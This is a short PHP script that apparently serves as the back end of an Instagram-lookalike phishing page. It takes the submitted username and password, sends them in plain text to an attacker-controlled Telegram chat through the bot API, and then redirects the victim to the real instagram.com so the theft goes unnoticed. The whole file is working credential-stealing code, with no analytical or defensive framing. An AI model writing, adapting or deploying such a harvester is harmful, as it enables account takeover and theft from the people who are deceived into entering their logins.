<?php
require_once 'vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

$token = $_ENV['TELEGRAM_BOT_TOKEN'];
$chat_id = $_ENV['TELEGRAM_CHAT_ID'];

$username = $_POST['username'];
$password = $_POST['password'];

// Prepare the message
$message = "Username: " . $username . "\nPassword: " . $password;

// Send the message to Telegram bot
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

// Call the Telegram API
file_get_contents($url);

header('Location: https://www.instagram.com');
exit();

?>
